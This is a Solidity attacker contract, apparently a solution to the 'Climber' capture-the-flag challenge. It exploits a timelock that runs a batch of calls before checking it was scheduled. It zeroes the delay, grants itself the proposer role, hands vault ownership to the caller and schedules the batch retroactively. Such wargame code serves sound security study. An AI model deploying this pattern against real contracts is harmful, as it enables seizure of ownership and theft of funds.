//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";

contract Climber {
    ClimberTimelock timelock;
    address vault;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt;

    constructor(address payable _timelock, address _vault) {
        timelock = ClimberTimelock(_timelock);
        vault = _vault;
    }

    function climb() public {
        targets.push(address(timelock));
        targets.push(address(timelock));
        targets.push(vault);
        targets.push(address(this));

        values.push(0);
        values.push(0);
        values.push(0);
        values.push(0);

        dataElements.push(
            abi.encodeWithSignature("updateDelay(uint64)", uint64(0))
        );
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );
        dataElements.push(
            abi.encodeWithSignature("transferOwnership(address)", tx.origin)
        );
        dataElements.push(abi.encodeWithSignature("_schedule()"));

        salt = keccak256("0");

        timelock.execute(targets, values, dataElements, salt);
    }

    function _schedule() public {
        timelock.schedule(targets, values, dataElements, salt);
    }
}
